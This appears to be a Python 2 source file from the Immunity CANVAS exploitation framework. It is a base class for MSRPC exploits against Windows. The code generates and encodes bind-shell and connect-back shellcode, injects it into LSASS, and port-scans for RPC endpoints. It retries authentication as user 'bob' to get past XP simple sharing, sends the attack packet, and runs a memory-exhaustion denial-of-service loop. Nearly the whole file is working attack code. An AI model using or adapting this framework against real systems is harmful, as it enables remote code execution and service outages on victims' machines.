#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003
#http://www.immunityinc.com/CANVAS/ for more information

#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

"""Base class for msrpc exploits that require just one packet..."""


import os
import getopt
import sys
import socket
import time

if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from encoder import *
from tcpexploit import tcpexploit
from msrpc import *
from shellcode import shellcodeGenerator, win32shell
import canvasengine
from listenerLine import listenerLine

#etc...
allnamedpipes=["\\spooler","\\lsarpc","\\srvsvc","\\epmapper","\\browser"]

shellcode_cache={}

class msrpcexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.UUID="" #the UUID I attack - all children should override me!
        self.covertness = 0
        self.port = 0
        self.host = "192.168.0.6"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.version = 0
        self.badstring = "\x00\\/.:$"
        self.myDCE = None
        self.autoversion=0
        self.connectionList=[] #none to start, fill this in with buildConnectionList()
        self.subesp=0
        #subclasses to this class should not redefine the following variable
        #unless they change the shellcode!
        self.listenerArgsDict["fromcreatethread"]=1
        self.startservice=None #used locally to start a service
        self.getcontexthandle=None
        self.forceauth=0
        self.object=""
        self.runlocalhost=None #function to use on localhost, if set
        self.response=0
        self.needsNoShellcode=0
        self.sleeptime=8
        self.namedpipe=""
        self.success=0
        self.exhaustsize=100000 # size of memory to exhaust for memory exhaustion attacks like Exchange_DoS
        self.exhaustsizes= [1000000,20000000,30000000,2000000,500000000,20000,10,2000000,30000000,4000000,0xffffffffL,0x7fffffffL,0x7402030,0x3000000]
        self.exhaustsizes+= [50000,3000,2000,4096,10000,3000000,20000000,3000000,0x400000,0x100000,0x200000,0x500000,0xf0102030,0xf4040302]
        for x in range(0,40):
            self.exhaustsizes+=[4000000,0xffffffffL,0x7fffffffL,0x7402030,0x3000000]
        #string we use for add_knowledge, if necessary
        self.knowledgestring=None
        self.portscan=1 #by default, do a full portscan. 
        return
   
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
     
    def am_bind_shellcode(self):
        """
        Returns true if we should use the bind shellcode
        """
        val = (self.callback.ip == "0.0.0.0")
        return val
        
    def createHeapShellcode(self):
        #for all of the exploits to prevent the heap corruption from disturbing us
        if self.callback==None:
            self.log("Cannot create heap shellcode without a callback...")

        # switch into bind port mode on "0.0.0.0"
        if self.am_bind_shellcode():
            key=("WIN32 HEAP BIND", self.callback.port, self.badstring )
            if key in shellcode_cache:
                self.shellcode=shellcode_cache[key]
                return self.shellcode 
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("BindMosdef", {"port" : self.callback.port })
            sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread", None)
            injectcode = sc.get()
            self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,host,port,smallcode=0,injectme=injectcode)            
        else:
            host=self.callback.ip
            port=self.callback.port
            key = ("WIN32 HEAP CALLBACK", host, port, self.badstring)
            if key in shellcode_cache:
                self.shellcode=shellcode_cache[key]
                return self.shellcode 

            #if smallcode is zero, then use fromcreatethread if running from commandline.
            # defaults to LSASS.EXE and lsass.exe
            self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,host,port,smallcode=0)
        shellcode_cache[key]=self.shellcode
        return self.shellcode
        
    def createShellcode(self):
        """
        Creates either a bind or a callback shellcode, depending on settings
        """
        dobind=0
        if self.needsNoShellcode:
            return
        
        if self.callback==None:
            self.log("Cannot create callback shellcode without a callback...")
            self.log("Using bind shellcode instead...hope that's what you wanted!")
            self.callback=listenerLine("win32bind",0,None,None,None,self.log,None)
            dobind=1
            self.callback.port=0
            port=self.callback.port

        host=self.callback.ip
        port=self.callback.port

        sc = shellcodeGenerator.win32()

        if dobind or self.am_bind_shellcode(): # switch into BindMosdef mode
            #you can't use the same port twice (because bindshell doesn't exit properly)
            if port==0:
                #pick a random port now...
                random.seed(os.getpid())
                port=random.randint(1,65534)
                self.callback.port=port
                self.log("Picked random port %d"%port)
            key=("MSRPC BIND", self.subesp, host, port, self.badstring)
            self.shellcode=shellcode_cache.get(key,None)
            if self.shellcode:
                return 1

            self.log("Creating shellcode to BindMosdef to %s:%s"%(host,port))
            sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("BindMosdef", {"port" : port})
            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread",None)
        else:
            self.log("Creating shellcode to callback to %s:%s"%(host,port))
            key=("MSRPC CALLBACK", self.subesp, port, host, self.badstring)
            self.shellcode=shellcode_cache.get(key,None)
            if self.shellcode:
                return 1
            sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)

            # ipv6 connectback support, transparent
            if ":" in str(host):
                sc.addAttr("IPv6ConnectBack", {"port" : str(port), "host" : str(host)})
            else:
                sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})

            sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
            sc.addAttr("ExitThread",None)

        rawshellcode = sc.get()

        if self.badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            shellcode_cache
            return 1

        self.log("Raw shellcode (before encoding) is %d bytes"%len(rawshellcode))
        #set up the shellcode
        #For testing purposes! (following line) Comment out for real use
        #rawshellcode=(badchartest(0,255,self.badstring)*50)[:len(rawshellcode)]
        #self.log("Last raw characters: %s"%prettyhexprint(rawshellcode[-16:]))
        self.encodeshellcode(rawshellcode)
        self.log("Encoded shellcode length: %d"%len(self.shellcode))
        #self.log("Last encoded characters: %s"%prettyhexprint(self.shellcode[-16:]))
        shellcode_cache[key]=self.shellcode 
        return 1

    def encodeshellcode(self,rawshellcode):
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        #these are the characters not allowed by the exploit
        encoder.setbadstring(self.badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            self.result_error=self.ERR_NO_SHELLCODE
            return 0
        #debug int
        #shellcode="\xcc"+shellcode        
        self.shellcode=shellcode
        return self.shellcode
    
    def searchifids(self):
        "generate our connectionList from ifids list"
        self.connectionList=[]

        ret=self.exploitnodes("dcedump")[0]
        if ret==None:
            ret=[]
        
        for result in ret:
            #search through the list of results
            if result.isUUID(self.UUID) and result.isRemote():
                #found an endpoint for our UUID
                self.connectionList += [result.getendpoint(self.host)]
                
        if self.connectionList!=[]:
            self.log("Found a remote endpoint in dcedump, using that...")
            self.log("Endpoint found: %s"%self.connectionList)
            return self.connectionList
        
        #knowledge primitive
        ifidsknown=self.target.get_knowledge("ifids",None)
        if ifidsknown==None:

            if self.engine:
                if self.portscan:
                    # rather large portscan
                    ranges=[(130,2048)]
                else:
                    #some very small range of ports to scan
                    ranges=[(135,140),(445,446),(1025,1030)]
                portscanner=self.engine.getModuleExploit("portscan")
                portscanner.link(self)
                allports=[]
                self.log("MSRPC Exploit scanning: %s"%(ranges))
                for r in ranges:
                    allports+=range(r[0],r[1])
                portscanner.argsDict["mode"]="chosen ports"
                portscanner.argsDict["allports"]=allports
                portscanner.argsDict["postscan"]="ifids"
                portscanner.argsDict["UUID"]=self.UUID
                ret=portscanner.run()
                if portscanner.UUIDfound:
                    #we found our ifid!
                    port=int(portscanner.UUIDfound)
                    self.log("Found our UUID on port %d"%port)
                    if portscanner.namedpipe: #named pipe ports
                        self.log("Using named pipe %s"%portscanner.namedpipe)
                        self.connectionList += ["ncacn_np:%s[%s]"% (self.host,portscanner.namedpipe)]                    
                    else:
                        self.connectionList += ["ncacn_ip_tcp:%s[%d]"% (self.host,port)]
                
                return self.connectionList
                
                
                #ifidsknown=self.target.get_knowledge("ifids",None)
                #if ifidsknown in [None,[]]:
                #    return []
            else:
                return []
            
        #get list from that
        ifidslist=ifidsknown.known
        #print "ifidlist=%s"%ifidlist
        for item in ifidslist:
            ifid=item[2]
            version=item[3]
            if ifid==self.UUID:
                if version==self.uuidversion:
                    #found the endpoint!
                    cL=item[1]
                    self.log("Found endpoint in stored ifids list %s"%cL)
                    self.connectionList=cL
                    
                    
        if self.connectionList==[]:
            self.log("Did not find: %s version: %s in: %s" % (self.UUID, self.uuidversion, ifidslist))
            self.log("Didn't find endpoint. Perhaps you need to portscan with ifids option on")
            
        return self.connectionList

    def buildTCPConnectionList(self):
        """
        Specify endpoints for the attack
        """
        if self.connectionList!=[]:
            return self.connectionList 
        if self.port==0:
            #else generate
            self.searchifids()
        else:
            #user specified
            if self.namedpipe and self.port in [139,445]:
                    self.connectionList += ["ncacn_np:%s[%s]"% (self.host,self.namedpipe)]                    
            else:
                #tcp, I assume
                self.connectionList += ["ncacn_ip_tcp:%s[%d]"% (self.host,self.port)]
        self.log("Connection list=%s"%repr(self.connectionList))
        return self.connectionList

    
    def test(self):
        self.getargs()
        if self.startservice:
            self.startservice()
        try:
            try:
                ret=self.testOS()
            except:
                self.result_error=self.ERR_NO_VERSION
                self.log("OSDETECT not available...")
                return 0

            if not ret:
                self.log("TestOS did not return...target will not be attacked - version returned: %d"%self.version)
                return 0
            
            if self.connect():
                self.port=self.myDCE.port
                return 1
        except DCEException, msg:
            self.result_error=self.ERR_COULD_NOT_CONNECT
            self.log("test failed: %s" % str(msg))
        return 0
    
    def buildConnectionList(self):
        self.connectionList=[]
        return []
    
    def testOS(self):
        """Sets the version properly, if possible"""
        #we default to "True" here because by default we do nothing...which always succeeds
        return True
    
    def connect(self):
        # connect DCE pipe
        #connectionList = ["ncacn_ip_tcp:%s[1029]"% (host)]
        connectionList =  self.buildConnectionList()
        devlog('msrpcexploit::connect', "connectionList: %s" % connectionList)

        self.myDCE = DCE(self.UUID, self.uuidversion, connectionList, covertness = self.covertness, getsock=self)
        self.myDCE.setUsername(self.user)
        self.myDCE.setPassword(self.password)
        self.myDCE.forceauth=self.forceauth
        if self.object:
            devlog("msrpcexploit","Self.object=%s"%self.object)
            self.myDCE.object=self.object
        try:
            map=self.myDCE.connect()
            if not map:
                self.log("Trying to connect with user \"bob\" to bypass XP simple sharing")
                self.myDCE.setUsername("bob")
                map=self.myDCE.connect()
                if not map:
                    self.raiseError("Could not connect to remote server - service is not running or the host is firewalled.")
        except DCEException, msg:
            self.log(msg)
            self.result_error=self.ERR_COULD_NOT_CONNECT
            return 0
        self.log("MSRPC exploit attacking %s" % map)
        return 1

    def parseResponse(self,buf):
        """override this to parse your response"""
        return 0
        
    def parseException(self,msg):
        "handles any exceptions (such as failed DCE packet)"
        #default to fail
        return 0
 
    # heapIndex(base, size)   Oded's style
    # Get the offset to the Lookaside entry
    #  base -> base address of Lookaside
    #  size -> size of the Lookaside you are looking for
    #  
    #  returns the virtual address of the entry
    def heapIndex(self, base, size):
        size += 0x0f
        size &= 0xfffffff8L
        size = size >> 3
        index = size*0x30
        index += 0x688
        index += base
        return index

    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)
        self.namedpipe=self.argsDict.get("namedpipe",self.namedpipe)
        self.portscan=int(self.argsDict.get("portscan", self.portscan))
        self.node=self.argsDict["passednodes"][0]
        self.portscan=int(self.argsDict.get("portscan",self.portscan))
        return
    
    def run(self):
        """
        Returns:
        1 (on sucessful callback), 0 (on failure), or CANVASNode instance (on successful bind/stole socket)
        """
        self.getargs()
        node=self.node
            
        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)
        
        #check to see if this is an information grabbing exploit and we already have
        #run it remotely
        if self.knowledgestring:
            kprim = self.target.get_knowledge(self.knowledgestring)
            #first check to see if we've already run this check!
            if kprim != None:
                #should we also if len(kprim)==1 ?
                self.result = kprim.known
                self.log("Already have %s in our knowledge tree - using %s"%(self.knowledgestring,self.result))
                return 1

        if node.islocal(self.target.interface) and self.runlocalhost:
            self.log("Running and msrpc exploit on the local host!")
            if self.startservice:
                self.startservice()
            self.log("Calling runlocalhost()")
            ret=self.runlocalhost()
            self.log("Runlocalhost returned!")
            return ret
    
        self.log("%s attacking %s with version %d"%(self.name, self.target.interface, self.version))
        if self.version == 0:
            if not self.autoversion:
                self.log("Currently the exploit does not have support for autoversioning.\nPlease specify version.")
                return 0
            else:
                self.testOS()
                if self.version==0:
                    self.log("Couldn't automatically determine version!")
                    self.result_error=self.ERR_NO_VERSION
                    return 0
        
        # connect 
        try:
            ret=self.connect()
            if not ret:
                self.log("Could not connect!")
                return 0
            
            if self.getcontexthandle:
                ret=self.getcontexthandle()
                if not ret:
                    self.log("Could not get a context handle")
                    self.result_error=self.ERR_FAILED
                    return 0

            self.setProgress(25)
            # get DCE pkt
            pkt = self.buildDcePacket()

            self.setProgress(50)

            self.log("Sending attack. Response = %s"%self.response)
            ret = self.myDCE.call(self.targetfunction, pkt, response=self.response)
            if self.response:
                self.parseResponse(get_all_stubs(ret))
            self.log("Attack sent")

            self.setProgress(75)
                            
        except self.error, msg:
            self.result_error=self.ERR_FAILED
            self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
            self.log("Failed reason: %s" % str(msg))
            return 0
        except DCEException, msg:
            if not self.parseException(str(msg)):
                self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
                self.log("Failed reason: %s" % str(msg))

        self.log("Sleeping %s seconds so server can recover slightly"%self.sleeptime)

        # Allow some extra time for SILICA engine to respond
        if(self.argsDict.get('silica')):
            if self.sleeptime:
                self.sleeptime+=4
            
        time.sleep(self.sleeptime)
        self.log("Done sleeping %s seconds, checking for success..."%self.sleeptime)

        ret=1
        if not self.ISucceeded():
            ret=self.win32NonCallbackShellcodeCheck()
            if ret: 
                self.result_error=self.SUCCESS
                self.success=1
                return ret 

        #self.target.add_knowledge("PrintProviders",self.result,100)
        if self.ISucceeded() or self.success:
            self.result_error=self.SUCCESS
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
        

        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), 
                     showlog=True)
        self.log("%s done (failed)"%self.name)
        self.result_error=self.ERR_FAILED
        return 0

    def run_exhaust_memory(self):
        """
        A varient of the run function that sends multiple attacks in an attempt to exhaust 
        memory.
        
        Returns:
        1 (on sucessful callback), 0 (on failure), or CANVASNode instance (on successful bind/stole socket)
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.user=self.argsDict.get("user",self.user)
        self.password=self.argsDict.get("password",self.password)
        self.namedpipe=self.argsDict.get("namedpipe",self.namedpipe)
        node=self.argsDict["passednodes"][0]
        
        self.setInfo("%s attacking %s:%d - (in progress)"% (self.name, self.host, self.port), showlog=True)
        
    
        if self.version == 0:
            if not self.autoversion:
                self.log("Currently the exploit does not have support for autoversioning.\nPlease specify version.")
                return 0
            else:
                self.log("Exploit %s supports autoversion - running testOS()"%self.name)
                ret=self.testOS()
                self.log("testOS set version to %d"%self.version)
                if not ret or self.version==0:
                    self.log("Couldn't automatically determine version!")
                    self.result_error=self.ERR_NO_VERSION
                    return 0
                
        self.log("Exploit %s running as version %d"%(self.name, self.version))
        
        try:
            ret=self.connect()
        except:
            ret=0
        if not ret:
            self.log("Could not connect - not trying to memory exhaust")
            return 0
        
        # connect

        for self.exhaustsize in self.exhaustsizes: 
            self.log("Sending memory request of %x"%self.exhaustsize)
            try:
                ret=self.connect()
                if not ret:
                    self.log("Could not connect - memory was exhausted!!")
                    return 1
                if self.getcontexthandle:
                    self.getcontexthandle()
                self.setProgress(25)
                # get DCE pkt
                pkt = self.buildDcePacket()
                self.setProgress(50)
                self.log("Sending attack. Response = %s"%self.response)
                ret = self.myDCE.call(self.targetfunction, pkt, response=self.response)
                if self.response:
                    self.parseResponse(get_all_stubs(ret))
                self.log("Attack sent")
                self.setProgress(75)
                                
            except self.error, msg:
                self.result_error=self.ERR_FAILED
                self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
                self.log("Failed reason: %s" % str(msg))
                return 0
            except DCEException, msg:
                if not self.parseException(str(msg)):
                    self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
                    self.log("Failed reason: %s" % str(msg))

        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), 
                     showlog=True)
        self.log("%s done (failed)"%self.name)
        self.result_error=self.ERR_FAILED
        return 0
